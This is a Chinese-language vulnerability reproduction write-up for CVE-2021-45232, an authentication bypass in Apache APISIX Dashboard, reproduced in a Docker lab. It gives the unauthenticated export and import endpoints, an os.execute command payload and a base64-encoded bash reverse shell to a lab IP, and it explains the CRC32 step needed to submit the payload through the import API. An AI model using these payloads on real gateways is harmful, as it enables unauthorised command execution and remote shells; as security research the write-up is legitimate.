漏洞描述


Apache APISIX 是一个动态、实时、高性能的开源API网关，提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX Dashboard设计的目的是让用户通过前端界面尽可能轻松地操作Apache APISIX。
根据官方描述，在2.10.1之前的Apache APISIX Dashboard中，Manager API使用了两个框架，并在框架‘gin’的基础上引入了框架‘droplet’，所有的API和认证中间件都是基于框架‘droplet’开发的，但有些API直接使用框架‘gin’的接口，从而绕过了认证。


  CVE编号：CVE-2021-45232 

  漏洞等级：高危

影响范围：< 2.10.1


安全版本：2.10.1

本地复现


  1、下载apisix-docker﻿﻿﻿﻿﻿﻿文件

sudo git clone  https://github.com/apache/apisix-docker

2、下载后进入apisix-docker/exampl目录，修改docker-compose.yml文件，

3、将版本号修改为2.7后，docker-compose up -d 启动

4、登录Apisix仪表盘，默认用户名密码admin/admin

5、未授权接口有两处

r.GET("/apisix/admin/migrate/export", h.ExportConfig)r.POST("/apisix/admin/migrate/import", h.ImportConfig)

6、Get请求exprot接口，获取数据

7、进一步命令执行，先正常登录，添加一条路由，注意后端业务需要网络可达，502情况下会影响命令执行。本次测试添加一条本地的80端口，添加后访问代理端口9080，可以访问代理后的页面

8、编辑配置，加入命令执行代码，已知通过script可以执行，添加exp如下

"script":"os.execute('touch /tmp/222.txt')",

9、添加后需要先访问一下9080端口，然后进入容器查看命令成功执行

10、同样可以反弹shell，本地nc监听6666端口，命令先进行base64编码，然后通过echo写入解码后的命令

"script": "os.execute('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTkyLzY2NjYgMD4mMQ== |base64 -d >/tmp/1.sh')

11、执行反弹shell脚本，成功反弹


12、替换到漏洞的实际利用，参考wuppp师傅写的脚本，可以加入命令执行的参数直接通过import接口提交，这里要注意下就是需要计算crc32，之前以为可以通过export获取数据直接覆盖，但其实是有问题的，因为测试环境script的exp是我通过路由接口正常添加，但实际环境中并没有该参数，所以添加exp或修改数据后会导致crc32值校验失败

13、根据本地环境重新编写脚本，对exp进行crc32校验后提交请求

14、登录仪表盘，查看已经新增了一条rce路由

15、登录docker，查看命令已经执行

16、wuppp师傅的脚本很好用，自行下载
